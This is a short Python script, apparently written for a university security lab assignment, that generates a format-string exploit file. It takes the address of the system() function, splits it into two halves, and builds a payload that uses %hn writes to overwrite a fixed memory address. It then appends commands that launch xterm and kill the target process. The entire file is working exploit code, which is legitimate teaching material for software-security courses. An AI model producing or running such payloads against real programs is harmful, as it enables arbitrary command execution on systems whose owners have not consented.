# run as python3 CS18B040_CS18B050.py <system address>
# where <system address> is the address of the system function in your system in standard hexadecimal notation, e.g., 0xf7e41950
# the name of the exploit string generated is CS18B040_CS18B050.exp

import sys
if len(sys.argv) < 2:
    print("Please give system's address as an argument")
    exit(0)
system_addr = int(sys.argv[1],16)
n1, n2 = (0xffff0000 & system_addr) >> 16, 0xffff & system_addr
st = b""
a1 = b"%7$hn"
a2 = b"%8$hn"
if(n1 > n2):
    st += b"\x0c\x30\xbc\x05" + b"\x0e\x30\xbc\x05"
    st += b"%"+bytes(str(n2-8), 'utf-8')+b"x"+a1
    st += b"%"+bytes(str(n1-n2), 'utf-8')+b"x"+a2

else:
    st += b"\x0e\x30\xbc\x05" + b"\x0c\x30\xbc\x05"
    st += b"%"+bytes(str(n1-8), 'utf-8')+b"x"+a1
    st += b"%"+bytes(str(n2-n1), 'utf-8')+b"x"+a2

st += b"\nxterm\npkill -f CS18B040_CS18B050"

with open('CS18B040_CS18B050.exp', 'wb') as f:
    f.write(st)

print("The exploit string is generated in CS18B040_CS18B050.exp")

